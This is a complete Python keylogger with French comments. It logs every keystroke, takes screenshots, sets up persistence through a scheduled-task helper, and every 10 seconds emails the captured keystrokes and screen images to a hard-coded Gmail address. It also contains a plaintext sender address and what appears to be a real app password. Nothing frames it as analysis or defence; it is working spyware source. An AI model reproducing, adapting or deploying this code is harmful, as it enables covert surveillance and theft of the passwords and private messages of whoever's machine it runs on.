import logging
from threading import Thread
from pynput.keyboard import Key, Listener
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
import PIL.ImageGrab
import time
import os
from TacheProgrammees import setupCron

#--------DÉBUT TÂCHES PROGRAMMÉES---------------

setupCron.setupCron()

#--------FIN TÂCHES PROGRAMMÉES----------------


#--------DÉBUT PARTIE ENVOI MAIL----------------

def sendMail():
    # Configuration pour l'envoi de mail
    port = 465
    smtp_server = "smtp.gmail.com"
    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
    receiver_email = "oussamaau123@gmail.com"    # adresse mail sur laquelle on veut recevoir le mail
    password = "tdcf hoql nrco flxv"             # mot de passe de l'expéditeur
    objet = "Fichier du keylog"
    corps = "Envoi du fichier keylog"

    # Création d'un mail multipart
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = objet

    message.attach(MIMEText(corps, "plain"))

    filename = "keylogs.txt"
    filename2 = "screen.png"

    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )
        message.attach(part)

    except FileNotFoundError:
        return

    try:
        with open(filename2, "rb") as attachment:
            part2 = MIMEBase("application", "octet-stream")
            part2.set_payload(attachment.read())
        encoders.encode_base64(part2)
        part2.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename2}",
        )
        message.attach(part2)

        context = ssl.create_default_context()

        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())

        print("Le mail a été envoyé")  # À enlever plus tard
    except Exception as e:
        print(f"Erreur lors de l'envoi du mail : {e}")

#--------FIN PARTIE ENVOI MAIL------------------


logging.basicConfig(filename="keylogs.txt", filemode="w",
                    datefmt='%d/%m/%Y %I:%M:%S %p', format='%(asctime)s:%(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

def screen():
    screen = PIL.ImageGrab.grab()
    path = os.getcwd()
    path+="/screen.png"
    screen.save(path)

# Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
def mail_thread():
    while True:
        time.sleep(10) #Temps d'attente entre deux mails
        screen()
        sendMail()

# L'envoi du mail se fait sur un thread séparé
Thread(target=mail_thread, daemon=True).start()


with Listener(on_press=on_press) as listener:
    listener.join()